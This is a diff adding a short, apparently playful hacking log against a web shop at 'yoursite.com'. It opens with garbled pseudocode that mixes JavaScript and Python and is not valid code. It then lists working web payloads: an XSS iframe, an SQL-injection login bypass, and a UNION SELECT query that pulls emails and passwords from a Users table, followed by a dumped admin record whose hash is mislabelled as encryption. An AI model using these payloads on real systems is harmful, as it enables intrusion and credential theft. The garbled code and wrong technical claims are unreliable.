@@ -1,0 +1,27 @@
+hack = require('lib')({token: process.env.STDBIL_SECRET_STUFF});
+if hack == TRUE:
+  event = context.parameter.event
+  text = context.split(' ');
+run.event.SQLInject(DBMS+user+id+^[a-zA-Z])
+ %%%%%injecting good stuff%%%%%
+trying search bar.......
+<h1>Hey there, World</h1>
+......no results :(
+.
+.
+.
+trying iframe.....
+<iframe src='javascript:alert(`xss`)'>....success
+trying email.....email:' OR true-- Password:sdf.....success
+running search bar exploit....http://yoursite.com/rest/products/search?q='--
+....sucess :D
+running gather....
+http://yoursite.com/rest/products/search?q'--)) UNION SELECT id,email,password FROM Users--
+.....success
+RESULTS: =>
+status: 'success'
+data:
+ 0:
+    id: 
+    name: 'admin@yoursite.com'
+    description: '01SEc92qz356se' - SHA 256 Encryption
